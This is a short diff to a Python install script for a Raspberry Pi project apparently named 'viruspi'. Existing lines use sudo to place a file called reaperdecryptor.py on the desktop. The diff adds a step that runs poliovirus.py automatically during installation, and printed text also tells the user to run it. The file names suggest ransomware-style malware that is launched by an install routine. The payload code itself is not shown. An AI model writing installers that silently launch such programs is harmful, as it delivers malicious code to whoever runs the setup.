@@ -28,5 +28,8 @@ os.system(cmd4)
 cmd5 = 'sudo mv /home/pi/Desktop/viruspi/reaperdecryptor.py /home/pi/Desktop/reaperdecryptor.py'
 os.system(cmd5)
 
+cmd6 = 'python3 poliovirus.py'
+os.system(cmd6)
+
 print('Almost there!')
 print('Enter the viruspi directory and run the command python3 poliovirus.py to complete installation!')
